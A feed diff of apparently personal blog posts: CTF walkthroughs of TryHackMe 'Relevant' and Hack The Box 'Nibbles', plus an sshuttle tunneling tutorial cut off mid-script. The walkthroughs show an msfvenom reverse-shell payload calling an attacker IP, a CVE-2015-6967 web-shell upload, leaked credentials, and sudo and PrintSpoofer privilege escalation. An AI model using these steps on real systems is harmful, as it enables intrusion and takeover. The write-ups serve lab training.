+        IPC&lt;span class="nv"&gt;$ &lt;/span&gt;           IPC       Remote IPC
+        nt4wrksv        Disk
+SMB1 disabled &lt;span class="nt"&gt;--&lt;/span&gt; no workgroup available
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;however, the &lt;code&gt;nt4wrksv&lt;/code&gt; share is quite unusual and seem to be worth exploring.&lt;/p&gt;
+
+&lt;h2&gt;relevant findings for exploitation&lt;/h2&gt;
+
+&lt;p&gt;so far, our main lead is exploiting samba and maybe find some pieces of information that might lead us to a reverse shell.&lt;/p&gt;
+
+&lt;h2&gt;exploitation&lt;/h2&gt;
+
+&lt;p&gt;since SMB1 is disabled, eternalblue is not even worth exploring for this target. let&amp;#39;s connect to &lt;code&gt;nt4wrksv&lt;/code&gt; with an anonymous connection:&lt;/p&gt;
+
+&lt;div class="highlight"&gt;&lt;pre class="highlight shell"&gt;&lt;code&gt;smbclient //10.10.143.157/nt4wrksv
+Enter WORKGROUP&lt;span class="se"&gt;\o&lt;/span&gt;velny&lt;span class="s1"&gt;'s password:
+Try "help" to get a list of possible commands.
+smb: \&amp;gt;
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;we quickly get our eyes on a &lt;code&gt;passwords.txt&lt;/code&gt; file, immediately accessible on this share with &lt;code&gt;more passwords.txt&lt;/code&gt;&lt;/p&gt;
+
+&lt;div class="highlight"&gt;&lt;pre class="highlight plaintext"&gt;&lt;code&gt;[User Passwords - Encoded]
+Qm9iIC0gIVBAJCRXMHJEITEyMw==
+QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;base64 encoded... easy fix, let&amp;#39;s decode those strings:&lt;/p&gt;
+
+&lt;div class="highlight"&gt;&lt;pre class="highlight shell"&gt;&lt;code&gt;&lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;"Qm9iIC0gIVBAJCRXMHJEITEyMw=="&lt;/span&gt; | &lt;span class="nb"&gt;base64&lt;/span&gt; &lt;span class="nt"&gt;-d&lt;/span&gt;
+Bob - &lt;span class="o"&gt;!&lt;/span&gt;P@&lt;span class="nv"&gt;$$&lt;/span&gt;W0rD!123
+&lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;"QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk"&lt;/span&gt; | &lt;span class="nb"&gt;base64&lt;/span&gt; &lt;span class="nt"&gt;-d&lt;/span&gt;
+Bill - Juw4nnaM4n420696969!&lt;span class="nv"&gt;$$$ &lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;connecting to SMB with those credentials works, but the permissions for those accounts are similar to anonymous connections. disappointing. bill and bob shall not help us any further, as this seems to be another red herring.&lt;/p&gt;
+
+&lt;div class="highlight"&gt;&lt;pre class="highlight shell"&gt;&lt;code&gt;smbmap &lt;span class="nt"&gt;-u&lt;/span&gt; Bob &lt;span class="nt"&gt;-p&lt;/span&gt; &lt;span class="s1"&gt;'!P@$$W0rD!123'&lt;/span&gt; &lt;span class="nt"&gt;-H&lt;/span&gt; 10.10.143.157
+&lt;span class="o"&gt;[&lt;/span&gt;+] IP: 10.10.143.157:445       Name: 10.10.143.157
+        Disk                                                    Permissions     Comment
+        &lt;span class="nt"&gt;----&lt;/span&gt;                                                    &lt;span class="nt"&gt;-----------&lt;/span&gt;     &lt;span class="nt"&gt;-------&lt;/span&gt;
+        ADMIN&lt;span class="nv"&gt;$ &lt;/span&gt;                                                 NO ACCESS       Remote Admin
+        C&lt;span class="nv"&gt;$ &lt;/span&gt;                                                     NO ACCESS       Default share
+        IPC&lt;span class="nv"&gt;$ &lt;/span&gt;                                                   READ ONLY       Remote IPC
+        nt4wrksv                                                READ, WRITE
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;after some additional attempts on SMB, i gave up to focus on web services yet again. surely there has to be something more about them...&lt;/p&gt;
+
+&lt;p&gt;&lt;img src="https://ovelny.sh/assets/images/tryhackme-writeup-relevant/2.jpg" alt="2.jpg"&gt;&lt;/p&gt;
+
+&lt;p&gt;and there is! turns out all of &lt;code&gt;nt4wrksv&lt;/code&gt; contents are directly accessible through HTTP on port 49663. we might be able to get a reverse shell exactly the same way.&lt;/p&gt;
+
+&lt;p&gt;since those web services are all powered by IIS servers, &lt;code&gt;.aspx&lt;/code&gt; ought to be our best option as payload output:&lt;/p&gt;
+
+&lt;div class="highlight"&gt;&lt;pre class="highlight shell"&gt;&lt;code&gt;msfvenom &lt;span class="nt"&gt;-p&lt;/span&gt; windows/x64/shell_reverse_tcp &lt;span class="nv"&gt;LHOST&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;10.9.186.16 &lt;span class="nv"&gt;LPORT&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;4444 &lt;span class="nt"&gt;-f&lt;/span&gt; aspx &lt;span class="nt"&gt;-o&lt;/span&gt; hacky.aspx
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;we then upload &lt;code&gt;hacky.aspx&lt;/code&gt; to the nt4wrksv share with &lt;code&gt;get hacky.aspx&lt;/code&gt; in SMB and execute the payload through HTTP (&lt;a href="http://target-ip:49663/nt4wrksv/hacky.aspx" rel="nofollow"&gt;http://target-ip:49663/nt4wrksv/hacky.aspx&lt;/a&gt;), instantly granting us a shell to our target and access to the output of &lt;code&gt;user.txt&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;enumerating privileges on our current user instantly shows us how we will escalate our privileges to &lt;code&gt;SYSTEM&lt;/code&gt;, since having &lt;code&gt;SeImpersonatePrivilege&lt;/code&gt; enabled instantly makes this box vulnerable to printspoofer64 (&lt;a href="https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/):" rel="nofollow"&gt;https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/):&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src="https://ovelny.sh/assets/images/tryhackme-writeup-relevant/3.jpg" alt="3.jpg"&gt;&lt;/p&gt;
+
+&lt;h2&gt;privilege escalation&lt;/h2&gt;
+
+&lt;p&gt;downloading &lt;code&gt;PrintSpoofer64.exe&lt;/code&gt; was instantly doable on target&amp;#39;s default location.&lt;/p&gt;
+
+&lt;p&gt;as always, making a quick and dirty HTTP server on our machine with &lt;code&gt;sudo python3 -m http.server 80&lt;/code&gt; works wonder.&lt;/p&gt;
+
+&lt;p&gt;all that is left for us is to run the executable with &lt;code&gt;-i -c powershell&lt;/code&gt; flags enabled, so we can get an interactive powershell session as &lt;code&gt;SYSTEM&lt;/code&gt;:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src="https://ovelny.sh/assets/images/tryhackme-writeup-relevant/4.jpg" alt="4.jpg"&gt;&lt;/p&gt;
+
+&lt;p&gt;getting &lt;code&gt;Root.txt&lt;/code&gt; output is now in our hands.&lt;/p&gt;
+
+&lt;h2&gt;summary&lt;/h2&gt;
+
+&lt;p&gt;this target was a nice demonstration of rabbit holes and red herrings that might be encountered during pentests. getting clues that are either too obvious or too intricate is often a good sign that something dubious might be happening behind the scenes.&lt;/p&gt;
+</content>
+  </entry>
+  <entry>
+    <id>tag:ovelny.sh,2020-04-15:/blog/hack-the-box-writeup-nibbles/</id>
+    <title type="html">hack the box writeup: nibbles</title>
+    <published>2020-04-15T00:00:00Z</published>
+    <updated>2020-04-15T00:00:00Z</updated>
+    <link rel="alternate" href="https://ovelny.sh/blog/hack-the-box-writeup-nibbles/" type="text/html"/>
+    <content type="html">&lt;h2&gt;full walkthrough&lt;/h2&gt;
+
+&lt;p&gt;as with everything, let’s start with enumeration on this target. a full nmap scan doesn&amp;#39;t expose much with this box: only the SSH and HTTP ports are open, the latter being used by apache.&lt;br&gt;
+the target&amp;#39;s address (&lt;a href="http://10.10.10.75" rel="nofollow"&gt;http://10.10.10.75&lt;/a&gt;) just leads to a &amp;quot;hello world&amp;quot; HTML page. by checking the source code however, we can see an HTML comment leading to another critical piece present on this target : a CMS called nibbleblog.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src="https://ovelny.sh/assets/images/hack-the-box-writeup-nibbles/s_176EB22770684CE253C2829BBED040B5405102CAF5E10F54FC870A1649049458_1582542053507_1.jpg" alt=""&gt;&lt;/p&gt;
+
+&lt;p&gt;browsing &lt;a href="http://10.10.10.75/nibbleblog" rel="nofollow"&gt;http://10.10.10.75/nibbleblog&lt;/a&gt; leads us to the homepage of the blog, which contains nothing of value. or does it?&lt;/p&gt;
+
+&lt;p&gt;&lt;img src="https://ovelny.sh/assets/images/hack-the-box-writeup-nibbles/s_176EB22770684CE253C2829BBED040B5405102CAF5E10F54FC870A1649049458_1582542088176_2.jpg" alt=""&gt;&lt;/p&gt;
+
+&lt;p&gt;pretty strange that an image would have a .php extension indeed. searching for vulns related to nibbleblog quickly leads to a related CVE: CVE-2015-6967&lt;/p&gt;
+
+&lt;p&gt;&lt;img src="https://ovelny.sh/assets/images/hack-the-box-writeup-nibbles/s_176EB22770684CE253C2829BBED040B5405102CAF5E10F54FC870A1649049458_1582542107275_3.jpg" alt=""&gt;&lt;/p&gt;
+
+&lt;p&gt;and indeed, following the mentioned URL on our target leads to something worthwhile:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src="https://ovelny.sh/assets/images/hack-the-box-writeup-nibbles/s_176EB22770684CE253C2829BBED040B5405102CAF5E10F54FC870A1649049458_1582542126158_4.jpg" alt=""&gt;&lt;/p&gt;
+
+&lt;p&gt;we can go through all parent directories from this URL, even though they&amp;#39;re supposed to remain private. does it mean that other directories are exposed?&lt;br&gt;
+yes, yes it does.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src="https://ovelny.sh/assets/images/hack-the-box-writeup-nibbles/s_176EB22770684CE253C2829BBED040B5405102CAF5E10F54FC870A1649049458_1582542164787_5.jpg" alt=""&gt;&lt;/p&gt;
+
+&lt;p&gt;let&amp;#39;s explore. the /admin/boot/rules/ path gives us a set of rules and settings related to the CMS, one of them confirming that this version of nibbleblog is indeed absolutely vulnerable, according to all the CVEs found earlier:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src="https://ovelny.sh/assets/images/hack-the-box-writeup-nibbles/s_176EB22770684CE253C2829BBED040B5405102CAF5E10F54FC870A1649049458_1582542188280_6.jpg" alt=""&gt;&lt;/p&gt;
+
+&lt;p&gt;looking back to the /content directories, we can also see that the admin&amp;#39;s username is indeed... admin.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src="https://ovelny.sh/assets/images/hack-the-box-writeup-nibbles/s_176EB22770684CE253C2829BBED040B5405102CAF5E10F54FC870A1649049458_1582542205151_7.jpg" alt=""&gt;&lt;/p&gt;
+
+&lt;p&gt;we could fire up hydra to get access to the dashboard, but a blacklist system exists in this CMS, which would make bruteforcing worthless for us:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src="https://ovelny.sh/assets/images/hack-the-box-writeup-nibbles/s_176EB22770684CE253C2829BBED040B5405102CAF5E10F54FC870A1649049458_1582542241708_8.jpg" alt=""&gt;&lt;/p&gt;
+
+&lt;p&gt;at this point i honestly got lost: even if the CMS&amp;#39; config and settings are widely exposed, there is nothing that could gives us the admin&amp;#39;s password. which we need to make use of that CVE later on!&lt;/p&gt;
+
+&lt;p&gt;after browsing all the files scratching my head, i gave up and googled some write-ups: turns out the admin&amp;#39;s password is just... nibbles.&lt;br&gt;
+yeah. sometimes it&amp;#39;s just better to follow your instinct rather than looking for something fancy. anyway, let’s move on…&lt;/p&gt;
+
+&lt;p&gt;executing CVE-2015-6967 can easily be done with the instructions found here: &lt;a href="https://curesec.com/blog/article/blog/NibbleBlog-403-Code-Execution-47.html" rel="nofollow"&gt;https://curesec.com/blog/article/blog/NibbleBlog-403-Code-Execution-47.html&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;here are the steps to follow:&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;go to &lt;a href="http://10.10.10.75/nibbleblog/admin.php?controller=plugins&amp;action=list" rel="nofollow"&gt;http://10.10.10.75/nibbleblog/admin.php?controller=plugins&amp;amp;action=list&lt;/a&gt; and click on &amp;quot;install&amp;quot; for my image plugin&lt;/li&gt;
+&lt;li&gt;fill up the fields with anything you want and upload a PHP web shell instead of an image&lt;/li&gt;
+&lt;li&gt;ignore warning while uploading&lt;/li&gt;
+&lt;li&gt;go to &lt;a href="http://10.10.10.75/nibbleblog/content/private/plugins/my_image/image.php" rel="nofollow"&gt;http://10.10.10.75/nibbleblog/content/private/plugins/my_image/image.php&lt;/a&gt; and enjoy your web shell!&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;for this purpose i used the following web shell, nice and simple: &lt;a href="https://github.com/nickola/web-console" rel="nofollow"&gt;https://github.com/nickola/web-console&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src="https://ovelny.sh/assets/images/hack-the-box-writeup-nibbles/s_176EB22770684CE253C2829BBED040B5405102CAF5E10F54FC870A1649049458_1582542282386_9.jpg" alt=""&gt;&lt;/p&gt;
+
+&lt;p&gt;the user flag can now be reached: &lt;strong&gt;b02ff32bb332deba49eeaed21152c8d8&lt;/strong&gt;&lt;br&gt;
+for the root one, we&amp;#39;re gonna need some additional privesc. running &lt;strong&gt;sudo -l&lt;/strong&gt; yields something interesting:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src="https://ovelny.sh/assets/images/hack-the-box-writeup-nibbles/s_176EB22770684CE253C2829BBED040B5405102CAF5E10F54FC870A1649049458_1582542321101_10.jpg" alt=""&gt;&lt;/p&gt;
+
+&lt;p&gt;our current user can run &lt;strong&gt;monitor.sh&lt;/strong&gt; at the given path as sudo without any password! we just need to make that script outputs the root flag and we will be done:&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;mkdir -p /home/nibbler/personal/stuff&lt;/strong&gt;&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;touch /home/nibbler/personal/stuff/monitor.sh&lt;/strong&gt;&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;chmod +x /home/nibbler/personal/stuff/monitor.sh&lt;/strong&gt;&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;echo &amp;quot;#!/bin/bash&amp;quot; &amp;gt; /home/nibbler/personal/stuff/monitor.sh&lt;/strong&gt;&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;echo &amp;quot;cat /root/root.txt&amp;quot; &amp;gt;&amp;gt; /home/nibbler/personal/stuff/monitor.sh&lt;/strong&gt;&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;cd /home/nibbler/personal/stuff/&lt;/strong&gt;&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;sudo ./monitor.sh&lt;/strong&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;and the root flag is now ours: &lt;strong&gt;b6d745c0dfb6457c55591efc898ef88c&lt;/strong&gt;&lt;/p&gt;
+</content>
+  </entry>
+  <entry>
+    <id>tag:ovelny.sh,2019-10-24:/blog/easy-tunneling-with-sshuttle/</id>
+    <title type="html">easy tunneling with sshuttle</title>
+    <published>2019-10-24T00:00:00Z</published>
+    <updated>2019-10-24T00:00:00Z</updated>
+    <link rel="alternate" href="https://ovelny.sh/blog/easy-tunneling-with-sshuttle/" type="text/html"/>
+    <content type="html">&lt;p&gt;sshuttle is a genius program that allows you to tunnel all of your traffic through SSH. as a result, it can act as a VPN for any machine you can SSH to. you don&amp;#39;t even need to be an admin of the distant server to achieve this. how amazing is that?&lt;/p&gt;
+
+&lt;p&gt;here&amp;#39;s what we want to achieve through SSH tunneling:&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;easily redirect all traffic through the SSH tunnel, DNS and all UDP traffic included&lt;/li&gt;
+&lt;li&gt;automate even more the process with some scripting&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;here&amp;#39;s what we want to &lt;strong&gt;avoid&lt;/strong&gt; by using sshuttle:&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;wasting hours configuring things on the server acting as a proxy&lt;/li&gt;
+&lt;li&gt;creating a new connection through &lt;code&gt;nmcli&lt;/code&gt; rather than being tunneled automatically&lt;/li&gt;
+&lt;li&gt;messing things up by misconfiguring something, openvpn being a good example of this.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;we&amp;#39;ll still have to make a reasonably configured server for our proxy, but this will take way less time than setting up a VPN with any other tool. let&amp;#39;s get started, with a digitalocean VPS.&lt;/p&gt;
+
+&lt;h2&gt;setting up a digitalocean VPS with sane defaults&lt;/h2&gt;
+
+&lt;p&gt;first of all, create your droplet on digitalocean. even if this would work for many linux flavor, this tutorial will use ubuntu. pick the latest LTS version and choose to create a $5 droplet, which will be more than enough for a proxy.&lt;/p&gt;
+
+&lt;p&gt;choose to paste your SSH public key to login in the settings. a one time password is hardly secure nor a good idea.&lt;/p&gt;
+
+&lt;p&gt;once your droplet is up and online, connect with SSH:&lt;/p&gt;
+
+&lt;div class="highlight"&gt;&lt;pre class="highlight shell"&gt;&lt;code&gt;ssh root@my-droplet-ip
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;first thing you should do is updating this freshly created server:&lt;/p&gt;
+
+&lt;div class="highlight"&gt;&lt;pre class="highlight shell"&gt;&lt;code&gt;apt-get update
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;then, we should work on disabling root access. let&amp;#39;s create a new user on this server:&lt;/p&gt;
+
+&lt;div class="highlight"&gt;&lt;pre class="highlight shell"&gt;&lt;code&gt;adduser your-user
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;give it a strong password during the creation process. next, add this user to the sudo group:&lt;/p&gt;
+
+&lt;div class="highlight"&gt;&lt;pre class="highlight shell"&gt;&lt;code&gt;usermod &lt;span class="nt"&gt;-aG&lt;/span&gt; &lt;span class="nb"&gt;sudo &lt;/span&gt;your-user
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;and while we&amp;#39;re at it, enable ufw (uncomplicated firewall). we&amp;#39;re gonna use it later on:&lt;/p&gt;
+
+&lt;div class="highlight"&gt;&lt;pre class="highlight shell"&gt;&lt;code&gt;ufw &lt;span class="nb"&gt;enable&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;we wanna connect through SSH with the user we just created. just as the same way we provided our public key during the droplet creation, we now have to repeat this process for the new user. first, switch from root to the user:&lt;/p&gt;
+
+&lt;div class="highlight"&gt;&lt;pre class="highlight shell"&gt;&lt;code&gt;su - your-user
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;and then, create a .ssh folder with the appropriate permissions:&lt;/p&gt;
+
+&lt;div class="highlight"&gt;&lt;pre class="highlight shell"&gt;&lt;code&gt;&lt;span class="nb"&gt;mkdir&lt;/span&gt; ~/.ssh
+&lt;span class="nb"&gt;chmod &lt;/span&gt;700 ~/.ssh
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;on your &lt;strong&gt;client&lt;/strong&gt; (not the server!), run the following command to get the output of your public key:&lt;/p&gt;
+
+&lt;div class="highlight"&gt;&lt;pre class="highlight shell"&gt;&lt;code&gt;&lt;span class="nb"&gt;cat&lt;/span&gt; ~/.ssh/id_rsa.pub
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;then paste it in the following file on the server:&lt;/p&gt;
+
+&lt;div class="highlight"&gt;&lt;pre class="highlight shell"&gt;&lt;code&gt;vim ~/.ssh/authorized_keys
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;save the file and exit, and change again the permissions to restrict access to the file:&lt;/p&gt;
+
+&lt;div class="highlight"&gt;&lt;pre class="highlight shell"&gt;&lt;code&gt;&lt;span class="nb"&gt;chmod &lt;/span&gt;600 ~/.ssh/authorized_keys
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;now return to the root user:&lt;/p&gt;
+
+&lt;div class="highlight"&gt;&lt;pre class="highlight shell"&gt;&lt;code&gt;&lt;span class="nb"&gt;exit&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;the last step with SSH is to edit sshd_config in order to restrict the access via the created user and the corresponding public key:&lt;/p&gt;
+
+&lt;div class="highlight"&gt;&lt;pre class="highlight shell"&gt;&lt;code&gt;vim /etc/ssh/sshd_config
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;look up and change appropriately the following lines in this file. make sure they are not commented as well (not beginning with &lt;strong&gt;#&lt;/strong&gt;):&lt;/p&gt;
+
+&lt;div class="highlight"&gt;&lt;pre class="highlight shell"&gt;&lt;code&gt;PasswordAuthentication no
+PubkeyAuthentication &lt;span class="nb"&gt;yes
+&lt;/span&gt;ChallengeResponseAuthentication no
+PermitRootLogin no
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;we&amp;#39;re almost done, but keep in mind that we have to allow incoming SSH connections with ufw:&lt;/p&gt;
+
+&lt;div class="highlight"&gt;&lt;pre class="highlight shell"&gt;&lt;code&gt;ufw limit ssh/tcp
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;The &lt;strong&gt;limit&lt;/strong&gt; setting here will ban any IP attempting and failing to connect repeatedly. combined with our changes on sshd_config, this is more than enough to protect this opened port.&lt;/p&gt;
+
+&lt;p&gt;last step for good measure is upgrading the system and rebooting the server:&lt;/p&gt;
+
+&lt;div class="highlight"&gt;&lt;pre class="highlight shell"&gt;&lt;code&gt;apt-get dist-upgrade &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; shutdown &lt;span class="nt"&gt;-r&lt;/span&gt; now
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;after reboot, make sure that you cannot SSH to the server with root, and connect with the created user instead:&lt;/p&gt;
+
+&lt;div class="highlight"&gt;&lt;pre class="highlight shell"&gt;&lt;code&gt;ssh your-user@my-droplet-ip
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;we&amp;#39;re 100% done with our server, unless you&amp;#39;re interested in the misc part at the end of this article. let&amp;#39;s move on to the client side.&lt;/p&gt;
+
+&lt;h2&gt;setting up sshuttle&lt;/h2&gt;
+
+&lt;p&gt;sshuttle is already available on most package managers. on archlinux, you can easily get it with &lt;code&gt;yay&lt;/code&gt;:&lt;/p&gt;
+
+&lt;div class="highlight"&gt;&lt;pre class="highlight shell"&gt;&lt;code&gt;yay sshuttle
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;keep in mind that sshuttle doesn&amp;#39;t tunnel UDP traffic (except DNS) by default. a bit of extra work is needed on that part with tproxy, as described in the documentation: &lt;a href="https://sshuttle.readthedocs.io/en/stable/tproxy.html" rel="nofollow"&gt;https://sshuttle.readthedocs.io/en/stable/tproxy.html&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;basically it boils down to the following steps:&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;run the following command as root after booting up:&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class="highlight"&gt;&lt;pre class="highlight shell"&gt;&lt;code&gt;ip route add &lt;span class="nb"&gt;local &lt;/span&gt;default dev lo table 100
+ip rule add fwmark 1 lookup 100
+ip &lt;span class="nt"&gt;-6&lt;/span&gt; route add &lt;span class="nb"&gt;local &lt;/span&gt;default dev lo table 100
+ip &lt;span class="nt"&gt;-6&lt;/span&gt; rule add fwmark 1 lookup 100
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;ul&gt;
+&lt;li&gt;run sshuttle as root with the tproxy method:&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class="highlight"&gt;&lt;pre class="highlight shell"&gt;&lt;code&gt;&lt;span class="nb"&gt;sudo &lt;/span&gt;&lt;span class="nv"&gt;SSH_AUTH_SOCK&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;"&lt;/span&gt;&lt;span class="nv"&gt;$SSH_AUTH_SOCK&lt;/span&gt;&lt;span class="s2"&gt;"&lt;/span&gt; sshuttle &lt;span class="nt"&gt;--method&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;tproxy &lt;span class="se"&gt;\&lt;/span&gt;
+                                             &lt;span class="nt"&gt;--disable-ipv6&lt;/span&gt; &lt;span class="se"&gt;\&lt;/span&gt;
+                                             &lt;span class="nt"&gt;--dns&lt;/span&gt; &lt;span class="se"&gt;\&lt;/span&gt;
+                                             &lt;span class="nt"&gt;--exclude&lt;/span&gt; your-server-ip &lt;span class="se"&gt;\&lt;/span&gt;
+                                             &lt;span class="nt"&gt;-r&lt;/span&gt; your-user@your-server-ip 0/0
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;that one is quite a mouthful so let&amp;#39;s break it down:&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;SSH_AUTH_SOCK=&amp;quot;$SSH_AUTH_SOCK&amp;quot;&lt;/code&gt; ensures that you can connect normally with SSH despise running sshuttle as root&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;--method=tproxy&lt;/code&gt; is here to, well, activate the tproxy method for UDP traffic&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;--disable-ipv6&lt;/code&gt; is self-explanatory. sadly, i found that my IPv6 address would leak otherwise, and i&amp;#39;m not sure what is causing this at the moment.&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;--dns&lt;/code&gt; is to forward all DNS requests through SSH&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;--exclude your-server-ip&lt;/code&gt; is required when forwarding all your traffic with tproxy, to prevent sshuttle from intercepting SSH packets&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;-r your-user@your-server-ip 0/0&lt;/code&gt; finally, where to forward your entire traffic (represented here as 0/0)&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;since IPv6 can leak even with the &lt;code&gt;--disable-ipv6&lt;/code&gt; command, let&amp;#39;s disable it while using sshuttle. this can be achieved temporarily by running the following commands as root:&lt;/p&gt;
+
+&lt;div class="highlight"&gt;&lt;pre class="highlight shell"&gt;&lt;code&gt;&lt;span class="nb"&gt;sudo &lt;/span&gt;sysctl &lt;span class="nt"&gt;-w&lt;/span&gt; net.ipv6.conf.all.disable_ipv6&lt;span class="o"&gt;=&lt;/span&gt;1
+&lt;span class="nb"&gt;sudo &lt;/span&gt;sysctl &lt;span class="nt"&gt;-w&lt;/span&gt; net.ipv6.conf.default.disable_ipv6&lt;span class="o"&gt;=&lt;/span&gt;1
+&lt;span class="nb"&gt;sudo &lt;/span&gt;sysctl &lt;span class="nt"&gt;-w&lt;/span&gt; net.ipv6.conf.lo.disable_ipv6&lt;span class="o"&gt;=&lt;/span&gt;1
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;this is all nice and well but i don&amp;#39;t see myself running all of this at each boot, so let&amp;#39;s wrap everything we mentioned in a script:&lt;/p&gt;
+
+&lt;div class="highlight"&gt;&lt;pre class="highlight shell"&gt;&lt;code&gt;&lt;span class="c"&gt;#!/usr/bin/env bash&lt;/span&gt;
+
+&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt; &lt;span class="s2"&gt;"&lt;/span&gt;&lt;span class="nv"&gt;$EUID&lt;/span&gt;&lt;span class="s2"&gt;"&lt;/span&gt; &lt;span class="nt"&gt;-ne&lt;/span&gt; 0 &lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="k"&gt;then
+    &lt;/span&gt;&lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;"This script must be run as root. Exiting."&lt;/span&gt;
+    &lt;span class="nb"&gt;exit
+&lt;/span&gt;&lt;span class="k"&gt;fi
+
+&lt;/span&gt;ip route add &lt;span class="nb"&gt;local &lt;/span&gt;default dev lo table 100
+ip rule add fwmark 1 lookup 100
+ip &lt;span class="nt"&gt;-6&lt;/span&gt; route add &lt;span class="nb"&gt;local &lt;/span&gt;default dev lo table 100
+ip &lt;span class="nt"&gt;-6&lt;/span&gt; rule add fwmark 1 lookup 100
+
+sysctl &lt;span class="nt"&gt;-w&lt;/span&gt; net.ipv6.conf.all.disable_ipv6&lt;span class="o"&gt;=&lt;/span&gt;1
+sysctl &lt;span class="nt"&gt;-w&lt;/span&gt; net.ipv6.conf.default.disable_ipv6&lt;span class="o"&gt;=&lt;/span&gt;1
+sysctl &lt;span class="nt"&gt;-w&lt;/span&gt; net.ipv6.conf.lo.disable_ipv6&lt;span class="o"&gt;=&lt;/span&gt;1
+
+sshuttle &lt;span class="nt"&gt;--method&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;tproxy &lt;span class="se"&gt;\&lt;/span&gt;
+    &lt;span class="nt"&gt;--disable-ipv6&lt;/span&gt; &lt;span class="se"&gt;\&lt;/span&gt;
+    &lt;span class="nt"&gt;--dns&lt;/span&gt; &lt;span class="se"&gt;\&lt;/span&gt;
